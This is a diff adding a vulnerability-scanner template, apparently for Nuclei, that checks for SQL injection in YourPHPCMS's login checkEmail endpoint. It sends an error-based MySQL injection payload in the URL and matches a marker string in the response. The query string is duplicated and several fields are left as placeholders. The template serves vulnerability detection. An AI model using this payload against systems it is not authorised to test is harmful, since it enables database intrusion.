@@ -1,0 +1,18 @@
+id: YourPHPCMS-login-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: YourPHPCMS login_checkEmail存在sql注入漏洞.
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=g=Admin&m=Login&a=checkEmail&userid=1&email=69710348@nwcrb.com'+AND+(SELECT+2*(IF((SELECT+*+FROM+(SELECT+CONCAT(0x7162716b71,(SELECT+(ELT(6927%3d6927,1))),0x717a717871,0x78))s),+8446744073709551610,+8446744073709551610)))--+wyju"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qbqkq'
